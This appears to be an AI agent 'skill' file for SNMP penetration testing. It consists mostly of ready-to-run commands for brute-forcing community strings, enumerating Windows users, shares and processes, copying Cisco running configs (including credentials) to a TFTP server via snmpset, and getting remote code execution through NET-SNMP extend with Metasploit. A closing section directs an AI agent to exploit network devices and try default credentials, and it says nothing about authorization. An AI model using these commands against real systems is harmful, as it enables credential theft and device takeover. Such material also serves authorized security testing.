# SNMP Pentesting Skill

## Goal

Enumerate and exploit SNMP (Simple Network Management Protocol) services to extract system information, discover network devices, and potentially gain remote code execution.

## Methodology

1. **Discovery**: Identify SNMP-enabled devices
2. **Community String Bruteforce**: Find valid community strings
3. **Enumeration**: Extract system info, users, processes, network configuration
4. **Configuration Extraction**: Dump device configurations
5. **Exploitation**: Leverage SNMP for RCE or lateral movement

## Background

SNMP uses "community strings" for authentication:
- **public**: Default read-only community string
- **private**: Default read-write community string
- SNMPv1/v2c: Community strings sent in plaintext
- SNMPv3: Supports authentication and encryption

## Tools

* **snmpwalk**: Walk SNMP MIB tree
* **snmp-check**: SNMP enumeration tool
* **onesixtyone**: Fast SNMP scanner
* **braa**: Mass SNMP scanner
* **snmpset**: Modify SNMP values
* **Metasploit**: SNMP modules

## Example Commands

```bash
# Discover SNMP services
nmap -sU -p161,162 --open target
nmap -sU -p161 --script snmp-* target

# Bruteforce community strings
onesixtyone -c /usr/share/wordlists/snmp.txt target
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt target

# nmap community string bruteforce
nmap -sU -p161 --script snmp-brute target

# Basic SNMP walk (requires valid community string)
snmpwalk -v2c -c public target

# SNMP enumeration with snmp-check
snmp-check -c public target

# Extended SNMP walk
snmpwalk -v2c -c public target 1.3.6.1.2.1

# Get specific OIDs
snmpget -v2c -c public target sysDescr.0
snmpget -v2c -c public target sysName.0
snmpget -v2c -c public target sysLocation.0

# Translate OIDs to readable names
snmpwalk -v2c -c public -O e target

# Mass SNMP scan with braa
braa public@target:.1.3.6.*
```

## Important OIDs

```bash
# System Information
snmpwalk -v2c -c public target 1.3.6.1.2.1.1    # System

# Network Interfaces
snmpwalk -v2c -c public target 1.3.6.1.2.1.2    # Interfaces

# Routing Table
snmpwalk -v2c -c public target 1.3.6.1.2.1.4.21 # IP Route Table

# ARP Table
snmpwalk -v2c -c public target 1.3.6.1.2.1.4.22 # IP Net to Media

# TCP Connections
snmpwalk -v2c -c public target 1.3.6.1.2.1.6.13 # TCP Connections

# UDP Listeners
snmpwalk -v2c -c public target 1.3.6.1.2.1.7.5  # UDP Table

# Installed Software
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.6.3.1.2 # hrSWInstalledName

# Running Processes
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2 # hrSWRunName

# Storage/Disk Info
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.2   # Storage

# Users (Windows)
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25 # Windows Users
```

## Windows SNMP Enumeration

```bash
# Windows users
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25

# Windows shares
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.27

# Windows services
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.3.1.1

# Windows domains
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.4.1

# Installed software
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.6.3.1.2

# Running processes
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2
```

## Cisco SNMP Enumeration

```bash
# Cisco configuration download (if RW community)
# Copy running config to TFTP
snmpset -v2c -c private target 1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1
snmpset -v2c -c private target 1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 i 4
snmpset -v2c -c private target 1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 i 1
snmpset -v2c -c private target 1.3.6.1.4.1.9.9.96.1.1.1.1.5.111 a <tftp_server>
snmpset -v2c -c private target 1.3.6.1.4.1.9.9.96.1.1.1.1.6.111 s running-config
snmpset -v2c -c private target 1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 1

# Or use Metasploit
msfconsole
use auxiliary/scanner/snmp/cisco_config_tftp
set RHOSTS target
set COMMUNITY private
run
```

## SNMP RCE

```bash
# NET-SNMP extend (if configured)
# Check for extend functionality
snmpwalk -v2c -c public target 1.3.6.1.4.1.8072.1.3.2

# If extend is present, commands may be executable
# Look for:
# NET-SNMP-EXTEND-MIB::nsExtendCommand
# NET-SNMP-EXTEND-MIB::nsExtendArgs

# Metasploit module
use exploit/linux/snmp/net_snmp_extend_rce
```

## SNMPv3 Enumeration

```bash
# SNMPv3 requires username and passwords
# authNoPriv: Authentication but no encryption
# authPriv: Authentication and encryption

# SNMPv3 walk
snmpwalk -v3 -u admin -l authNoPriv -a MD5 -A password target

# With encryption
snmpwalk -v3 -u admin -l authPriv -a SHA -A authpass -x AES -X privpass target

# Bruteforce SNMPv3 users
nmap -sU -p161 --script snmp-brute target
```

## Metasploit Modules

```bash
# SNMP enumeration
use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/snmp_enumshares

# Community string bruteforce
use auxiliary/scanner/snmp/snmp_login

# Cisco config extraction
use auxiliary/scanner/snmp/cisco_config_tftp
use auxiliary/scanner/snmp/cisco_upload_file
```

## Guidance for AI

* Activate this skill when user wants to enumerate SNMP, extract network info, or exploit network devices
* **Default credentials**: Try "public" and "private" community strings first
* SNMP runs on UDP 161 (agent) and 162 (traps)
* SNMPv1/v2c have no encryption - community strings visible in packet captures
* SNMPv3 is more secure but often misconfigured
* Write access ("private") allows:
  - Configuration changes
  - TFTP config download/upload
  - Potential RCE via NET-SNMP extend
* Windows SNMP can reveal users, shares, services, software
* Cisco SNMP can dump entire configuration including credentials
* Always scan for SNMP - it's commonly overlooked in security hardening
* onesixtyone is fast for large-scale community string bruteforcing
